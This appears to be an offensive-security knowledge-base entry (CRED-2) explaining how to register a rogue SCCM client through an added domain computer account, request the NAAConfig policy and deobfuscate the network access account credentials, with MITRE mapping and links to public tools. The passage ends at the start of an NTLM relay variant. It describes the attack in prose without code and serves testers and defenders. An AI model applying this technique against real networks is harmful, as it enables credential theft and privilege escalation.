# CRED-2

## Description
Request computer policy and deobfuscate secrets

## MITRE ATT&CK TTPs
- [TA0006](https://attack.mitre.org/tactics/TA0006/) - Credential Access
- [T1555](https://attack.mitre.org/techniques/T1555/) - Passwords from Password Stores

## Requirements
- PKI certificates are not required for client authentication [DEFAULT]

  AND

- Domain computer account credentials or (`MachineAccountQuota` > `0` and `Add workstations to domain` includes `Domain Users` [DEFAULT])

## Summary
The [network access account](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#network-access-account) (NAA) is a domain account that can be configured on the site server. Clients use the NAA to access and retrieve software from a distribution point but serves no other purpose on the client. The credentials are retrieved by clients as part of the Computer Policy. Upon receipt, the client will encrypt the NAA using the Data Protection API (DPAPI). But what happens before that? How are the secrets protected in transit before the client protects them with DPAPI?

The client's first step is to request a list of available policies. For this technique, only `NAAConfig` is covered. The `NAAConfig` policy contains the obfuscated NAA credentials. To request this policy, the request headers must contain some important information, all of which is available at this stage.

This policy endpoint also requires authentication. Specifically, it requires authentication as an SCCM client in an `Approved` status. SCCM's default setting is `Automatically approve computers in trusted domains (recommended)`. This means the MP will automatically approve any client registration requests from computers in a trusted domain, such as the MP's domain.

There are two options for the next step:
1) compromise a computer account, such as local privilege escalation
2) add a computer account to the domain.

Option 2 is possible if the domain's `MachineAccountQuota` attribute is set to any value greater than `0` (the default value is `10`). Various tooling, such as Kevin Robertson's [Powermad](https://github.com/Kevin-Robertson/Powermad) can be used to add a computer account.

The `Default Domain Policy > Computer Configuration > Policies > Windows Settings > Security Settings > User Rights Assignment > Add workstations to domain` GPO can also be configured to a non-default principal (something other than `Domain Users`). If permission to add a computer object is denied and `MachineAccountQuota` is a non-zero value, it is likely this GPO is the culprit.

With this domain computer context, the computer can be registered as a client which will be automatically approved, then policy can be requested and deobfuscated, as discovered and published by Adam Chester in his [blog](https://blog.xpnsec.com/unobfuscating-network-access-accounts/) and [tool](https://github.com/xpn/sccmwtf).

This technique has also been built into [SharpSCCM](https://github.com/Mayyhem/SharpSCCM/wiki/get#get-naa--get-secrets) with the `get secrets` and `get naa` commands.

The `get secrets` command extends this technique to retrieve collection variables and task sequences from machine policies, which may also contain secrets such as credentials.

## Impact
In environments using Active Directory defaults, SCCM defaults, and NAAs (or collection variables/task sequences containing credentials), any domain-authenticated user may create a computer object, register it as an SCCM client, request the machine policy, and deobfuscate credentials.

If the NAA or credential stored in a collection variable or task sequence is implemented under the principle of least privilege, this may not extend the attacker's privilege level in the domain. The more common result: If the NAA is overprivileged, this technique serves as a trivial privilege escalation vector.

NTLM Relay:
It is also possible to conduct these attacks by coercing authentication from a domain computer (including the one you're operating from) and relaying to a management point:
